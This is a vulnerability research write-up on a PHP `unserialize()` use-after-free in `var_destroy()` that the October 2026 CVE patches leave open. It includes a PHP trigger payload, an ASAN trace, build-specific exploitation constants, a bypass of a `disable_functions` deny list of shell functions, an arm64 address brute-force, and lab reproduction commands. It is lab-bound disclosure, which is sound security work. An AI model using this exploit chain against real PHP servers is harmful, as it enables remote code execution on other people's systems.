# The patch didn't cover it

### CVE-2026-109618 / -109619, the `var_destroy` lock gap, and the controls that bound it

**Date:** 2026-10-31 · **Scope:** lab-only, `127.0.0.1` · **Proof command:** `id>/tmp/vd 2>&1` (fixed, benign) · **Series:** [index](https://github.com/pax-k/php2shell-hunt/blob/main/docs/PUBLICATION_SERIES/README.md)

> **Lab boundary.** Local containers only; targets `127.*`/`::1`; the only
> command executed was the fixed, benign `id>/tmp/vd 2>&1`; no command interface.

---

## 1. Two CVEs, one unclosed line

The 2026-10-21 advisories cover two memory-safety bugs in PHP core, CVSS v4.0
9.2, fixed in 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12.

**109618 (OOM corruption).** A failed allocation in a partly initialized
request left state that shutdown later read. The patch replaces `longjmp()`:
a delayed soft OOM at the next VM safe point, a hard limit that calls
`_exit(137)`, and `ZEND_HAS_OOM()` bail-outs in multipart parsing.

**109619 (stale global state).** Worker globals could point at request-owned
memory; a fatal error skipped the reset and the next request consumed the
stale state. The patch clears `PG(http_globals)`, `clear_last_error()`,
`EG(delayed_oom)`, and `PG(modules_activated)` at shutdown, adds an early
executor reset, and calls `php_basic_early_rinit()`.

The session part matters here: `PS(in_rfc1867_update)` plus
`incomplete_classes_only` forces objects decoded during an upload-progress
update to `__PHP_Incomplete_Class` (no autoload, no magic methods, no
destructors), and `$_SESSION` is removed at `MULTIPART_EVENT_END`.

The same patch touches `ext/standard/var_unserializer.re` (~139 added lines)
but does not add `BG(serialize_lock)` around the destructor walk:

```c
/* var_destroy(), abridged: the chain is freed, then the list is walked */
while (var_hash) { next = var_hash->next; efree_size(...); var_hash = next; }
while (var_dtor_hash) {
    for (i = 0; i < var_dtor_hash->used_slots; i++) {
        zval *zv = &var_dtor_hash->data[i];
        /* __wakeup / __unserialize take BG(serialize_lock) here */
        i_zval_ptr_dtor(zv);       /* __destruct: lock still zero */
    }
}
```

The destructor re-enters `unserialize()`. With lock zero and level positive,
`php_var_unserialize_init()` reuses the just-freed chain
(`if (BG(serialize_lock) || !BG(unserialize).level) fresh; else stale;`), so
the nested parser reads `(*var_hash)->last->used_slots` from freed memory.
`__wakeup`/`__unserialize` bracket their calls with the lock; `__destruct`
does not.

| Path | State after 8.4.27 / 8.5.12 |
|---|---|
| 109618 OOM → shutdown | closed |
| 109619 stale globals, both consumers | closed (progress → incomplete classes) |
| `var_destroy()` destructor walk | **unchanged: lock zero** |

**Ceiling.** Diff-and-source plus an ASAN receipt, not a claim about intent;
the advisory does not list this re-entry.

## 2. Prior art before the claim

None of the primitive is ours. The delayed-destructor re-entry UAF was
published by **dinosn** on 2026-05-02
(`github.com/dinosn/php-8.5.5-var_destroy-uaf`), a sister finding to
**Calif.io**'s MAD Bugs on 2026-05-01. PHP's policy since August 2017 is not to
issue CVEs for `unserialize()` memory-corruption bugs, so no CVE is claimed and
this bug has no advisory. The 115560 composition that delivers it pre-auth is
public in **ACD421/PHP** `fa_jammy.sh` (2026-10-26), with the injection and
stock `cleanup=1` race in `zero1` (2026-10-21). mnk-works, TheCyberGeek, and
Qi Deng / `ikow` published escalation work; the `dtor_obj = zif_system`
terminal is public in ACD421 `zero4`/`zero5`.

What this post adds is narrower: the patch-gap confirmation on 8.4.27 / 8.5.12,
the stock-ZendMM ladder, the hardened run, and the repeatable constants. The
retraction of an earlier internal claim of originality is in
[`NOVELTY_115560_2026-10-31.md`](https://github.com/pax-k/php2shell-hunt/blob/main/docs/NOVELTY_115560_2026-10-31.md).

## 3. What still fires on patched 8.4.27 / 8.5.12

The trigger predates every CVE in this series: a 1018-element array with a
duplicate key.

```php
class T { public function __destruct() { @unserialize('i:0;'); } }
$p = 'a:1018:{' . str_repeat('i:0;N;', 1016)
   . 'i:99999;O:1:"T":0:{}'
   . 'i:99999;i:42;' . '}';
@unserialize($p);
```

`struct var_entries` is `16 + 8 * 1018 = 8160` bytes, two ZendMM pages. At 1017
elements the extension chunk is never freed and the nested read finds live
memory; at 1018 `var_destroy()` frees it, then runs the delayed destructor.
The duplicate key is what enqueues the object: `var_push_dtor_value()` records
a value only when it is overwritten.

Delivered through `session_start()` on the instrumented 8.4.27 and 8.5.12
builds (`lab-asan-85x`), the payload raises this report:

```text
ERROR: AddressSanitizer: heap-use-after-free ... READ of size 8
    #0  php_var_unserialize          ext/standard/var_unserializer.c:906
    #13 var_destroy                  ext/standard/var_unserializer.c:319
    #14 php_var_unserialize_destroy  ext/standard/var_unserializer.c:94
    #15 ps_srlzr_decode_php          ext/session/session.c:1176
    #16 php_session_decode           ext/session/session.c:279
    #17 php_session_initialize       ext/session/session.c:506
    #18 php_session_start            ext/session/session.c:1753
```

The lines are from the generated C the build cites; 8.2.34 reports the same
access at `var_unserializer.c:850`. The bottom frame is `session_start()`, with
no application frame: the decoder is the sink. That delivery is CVE-2026-115560;
minimal verifier:
[`verify_var_destroy_uaf.php`](https://github.com/pax-k/php2shell-hunt/blob/main/poc/verify_var_destroy_uaf.php). The gap is independent of arrival.

On stock ZendMM the read is silent — the freed chunk is still mapped and holds
the old bookkeeping. With same-size grooming in the destructor the chunk is
reclaimed, and `R:1020;` dereferences the reclaimed bytes as a `zval *`; the
forged object's `handlers->dtor_obj` is `zif_system`. Dropping the reference
reaches `zend_reference_destroy()` → `i_zval_ptr_dtor()` →
`zend_objects_store_del()` → an indirect call, and the fixed command runs as
the web user (`main=0xffff9ee00000`, `carrier=0xffff9ee7b02d`, `uid=33`). ASAN
says the edge exists; this run says it reaches the terminal.

| Build | Carrier delta | Spray | `lib − main` | `zif_system` |
|---|---|---|---|---|
| 8.4.27 | `0x6c019` | `3048` | `+0x2130000` | `0x431510` |
| 8.5.12 | `0x6c019` | `8135` | `-0x3600000` | `0x535490` |

Uppercase `R:` is required; lowercase `r:` takes `var_push`, which writes at a
`used_slots` value read from the reclaimed header — a wild write, not the
controlled read.

## 4. `disable_functions` is not a wall

A hardened target sets
`disable_functions = system,exec,shell_exec,passthru,popen,proc_open,pcntl_exec`.
On 8.4.27 that is real: `function_exists('system')` is `false`, and a direct
call is a fatal `undefined function`. The public 115560 simple-gadget path
looks `system` up in the function table, where `disable_functions` installs a
stub, so that path stops.

The forged chain does not use the table. `handlers->dtor_obj` is an address in
`libphp.so`, so the engine makes an indirect C call and the stub is never
consulted. The hardened container at `:18203`
(`lab-115560/docker-compose.nofunc.yml`) produced:

```text
[f] proof='uid=33(www-data) gid=33(www-data) groups=33(www-data)'
```

The proof file was removed beforehand; the same addresses with
`--bias-zif 0x1000` then produced `proof=''` and no file. The mod_php probe also
confirmed `function_exists(system)=false` and `disable_functions` loaded from
`/usr/local/etc/php/conf.d`, ruling out a CLI-only ini. Full receipt:
[`NOFUNC_115560.md`](https://github.com/pax-k/php2shell-hunt/blob/main/docs/NOFUNC_115560.md).

**Ceiling.** The property is public: ACD421's forged destructor and
TheCyberGeek's handler overwrite already showed it. This is an application on
the 115560 delivery, not a discovery.

## 5. The arm64 window, and the two unsolved seeds

The ladder needs a carrier address. On arm64 with `vm.mmap_rnd_bits = 18`, the
ZendMM `main` chunk has nine bits of entropy: 512 possible 2 MiB slots across
`0xFFFF78000000..0xFFFFC0000000`, or 576 candidates at `0x200000` steps. A
wrong guess kills a child; the parent respawns it. Children inherit `main`, so
one correct slot works for every child.

```text
8.5.12  351 attempts (1406 s)  main=0xffffa3c00000 -> uid=33
8.4.27  307 attempts (1238.8 s) main=0xffff9e400000 -> uid=33
```

An exact-main check is one attempt (1.8 s). This is the 115560 delivery's
no-`/proc` result, and it is **arm64-specific**.

What is not solved:

- **Native x86-64.** At `mmap_rnd_bits = 28` the space is roughly `2^19`; the
  chain needs a leak or external seed. amd64 under Rosetta works with explicit
  addresses (`main = 0x7ffffc400000`, `lib = 0x7ffffe007000`,
  `lib − main = 0x1c07000`, `zif_off = 0x46ad70`), but that is emulated
  userspace with a deterministic seed, not a native result.
- **The FPM in-band leak.** The mod_php path is the one with receipts; the FPM
  leak is unsolved here, and a 4.1M-execution ASAN campaign over
  `unserialize()` / `session_decode()` found no generic in-band seed.
- **A universal carrier.** Constants are per request shape and build; a rebuilt
  container can drift by `+0x1e000..0x20000`, so the driver re-measures.

Mechanism notes: [`X86_64_115560.md`](https://github.com/pax-k/php2shell-hunt/blob/main/docs/X86_64_115560.md), [`VAR_DESTROY_UAF.md`](https://github.com/pax-k/php2shell-hunt/blob/main/docs/VAR_DESTROY_UAF.md).

## 6. Reproduce it, carefully

Everything is local and containerised. Bring-up and the direct proof:

```sh
cd lab-115560 && docker compose up -d && cd ..
python3 poc/verify_115560_vardestroy.py --target 127.0.0.1:18200 \
  --container php2shell-115560-8427 --build 8.4.27 run
```

| Claim | Code | Command |
|---|---|---|
| ASAN UAF, minimal payload | [`verify_var_destroy_uaf.php`](https://github.com/pax-k/php2shell-hunt/blob/main/poc/verify_var_destroy_uaf.php) | `php` under ASAN |
| reclaim → forged object → `zif_system` | [`verify_vardestroy_rce.py`](https://github.com/pax-k/php2shell-hunt/blob/main/poc/verify_vardestroy_rce.py) | stock ZendMM |
| 115560 → `var_destroy` → terminal | [`verify_115560_vardestroy.py`](https://github.com/pax-k/php2shell-hunt/blob/main/poc/verify_115560_vardestroy.py) | `--build 8.4.27 run` |
| default `cleanup=On` race | [`verify_115560_race.py`](https://github.com/pax-k/php2shell-hunt/blob/main/poc/verify_115560_race.py) | `--settle 0.7 --attempts 3` |
| `__wakeup` / `__unserialize` negative | [`verify_115560_wakeup.py`](https://github.com/pax-k/php2shell-hunt/blob/main/poc/verify_115560_wakeup.py) | expected negative |
| arm64 window scan, no `/proc` | [`verify_vardestroy_bruteforce.py`](https://github.com/pax-k/php2shell-hunt/blob/main/poc/verify_vardestroy_bruteforce.py) | window scan |
| lab bring-up | [`lab-115560/docker-compose.yml`](https://github.com/pax-k/php2shell-hunt/blob/main/lab-115560/docker-compose.yml) | loopback only |

Do not reuse a delta across drivers: the request shape moves the carrier, and a
wrong delta looks like a chain failure but is a measurement failure. Race
deltas are `0x6d875` (8.4.27) and `0x80875` (8.5.12); the direct delta is
`0x6c019`. The race needs a second prefork child and
`lab-115560/webroot/seed.php`; the control table is in
[`RACE_WAKEUP_115560.md`](https://github.com/pax-k/php2shell-hunt/blob/main/docs/RACE_WAKEUP_115560.md).

## 7. The caveats, in one place

- **Not default PHP.** The default handler is `php`; 115560 needs
  `php_serialize`/`php_binary` configured *and* a runtime switch to `php`.
- **A re-entry destructor is required.** A plain `shell_exec` destructor suits
  only the public simple-gadget path; this ladder needs one that sprays and
  calls `unserialize()` again.
- **The gap is adjacent.** The fixes close the OOM and stale-state paths and
  the pre-RINIT decode; they do not touch the unlocked walk.
- **No-`/proc` and constants are conditional.** arm64 at 18 bits only; native
  x86-64 needs a leak, Rosetta is not native coverage, and a rebuild can drift.
- **The composition is public.** ACD421 (2026-10-26), `zero1` (2026-10-21),
  dinosn (2026-05-02), Calif.io (2026-05-01); nothing here is claimed as a new
  vulnerability or a CVE.
- **The terminal is fixed.** `id>/tmp/vd 2>&1`; no command interface.

